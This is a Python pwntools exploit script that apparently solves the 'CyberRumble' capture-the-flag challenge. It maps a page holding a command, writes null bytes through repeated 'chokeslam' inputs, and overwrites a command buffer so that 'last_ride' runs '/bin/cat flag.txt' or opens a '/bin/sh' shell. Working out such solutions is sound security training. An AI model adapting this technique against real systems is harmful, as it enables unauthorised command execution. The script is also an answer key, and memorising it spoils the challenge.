#!/usr/bin/env python3
from pwn import *

import os

exe = ELF(".build/CyberRumble" if os.path.exists(".build/CyberRumble") else "CyberRumble")
context(binary=exe)
context.log_level = "warn"

REMOTE = 1
SHELL = 0

# Read target from the environment so `pwnmake check` can drive HOST/PORT
HOST = os.environ.get("HOST", "localhost")
PORT = int(os.environ.get("PORT", 19002))


def connect_remote():
	return remote(HOST, PORT)

def connect_local():
	r = exe.process()
	# gdb.attach(r, "c")
	return r

def connect():
	return connect_remote() if REMOTE else connect_local()


def do_chokeslam(r, argstr):
	r.sendline(b"chokeslam " + argstr)
	return r.recvline()

def do_old_school(r, argstr, response):
	r.sendline(b"old_school " + argstr)
	r.recvuntil(b"Shellcode written to ")
	leak = r.recvline().strip().rstrip(b".")
	page = int(leak, 16)
	info("Page mapped at 0x%x" % page)

	r.recvuntil(b"Jump to shellcode?")
	r.sendline(response)

	return page

def do_last_ride(r, argstr):
	"""
	Consider the command "last_ride ab\0de\0g\0". We can run this command with the
	following sequence of commands ('.' and '@' can be any characters):

	chokeslam .....@g
	chokeslam ..@de
	last_ride ab
	"""

	nulls = argstr.count(b"\0")
	for _ in range(nulls):
		prefix, suffix = argstr.rsplit(b"\0", 1)
		do_chokeslam(r, b"." * len(prefix) + b"@" + suffix)
		argstr = prefix

	r.sendline(b"last_ride " + argstr)


def main():
	r = connect()

	if SHELL:
		command = b"/bin/sh"
	else:
		command = b"/bin/cat flag.txt"

	# Map a page with the contents of a command to run.
	# By responding with something other than y/n, the memory isn't unmapped.
	command_addr = do_old_school(r, command, b"x")

	# Here are the target contents of the command buffer before we run last_ride
	target = p64(command_addr)

	# Place binary address in command buffer and run last_ride command
	do_last_ride(r, target)

	if SHELL:
		info("Got a shell!")
		r.interactive()
	else:
		r.recvuntil(b"sun{", drop=True)
		print("Got flag: sun{" + r.recvuntil(b"}").decode(errors="replace"))

if __name__ == "__main__":
	main()
